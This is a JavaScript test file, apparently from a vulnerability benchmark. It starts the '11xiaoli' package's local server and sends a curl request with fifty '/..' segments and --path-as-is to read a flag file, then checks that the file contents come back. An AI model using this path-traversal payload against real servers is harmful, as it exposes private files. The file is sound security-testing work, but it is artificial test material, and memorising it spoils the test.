const v22 = require('child_process');
var execSync = v22.execSync;
const v24 = () => {
    try {
        const v23 = execSync('fuser -k 8888/tcp');
        v23;
    } catch (e) {
    }
};
const v25 = afterAll(v24);
v25;
const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v26 = '/..'.repeat(50);
    const v27 = v26 + pathToFlag;
    return v27;
};
const v41 = done => {
    const v28 = expect.assertions(1);
    v28;
    const fs = require('fs');
    const sleep = require('sleep');
    const v29 = require('child_process');
    const exec = v29.exec;
    const v30 = fs.readFileSync(pathToFlag);
    let hostsFile = v30.toString();
    const a = require('child_process');
    try {
        const v31 = () => {
        };
        const v32 = a.execSync('fuser -k 8888/tcp', v31);
        v32;
    } catch (e) {
    }
    let server = 'node ./node_modules/11xiaoli/dome.js';
    const v33 = (error, stdout) => {
    };
    let exe = exec(server, v33);
    const v34 = sleep.sleep(2);
    v34;
    const v35 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${ v35 }"`;
    const v40 = (error, stdout) => {
        let out = false;
        const v36 = stdout.includes(hostsFile);
        if (v36) {
            out = true;
        }
        const v37 = expect(out);
        const v38 = v37.toBe(true);
        v38;
        const v39 = done();
        v39;
    };
    let val = exec(attack_string, v40);
};
const v42 = test('Path Traversal in 11xiaoli', v41, 30000);
v42;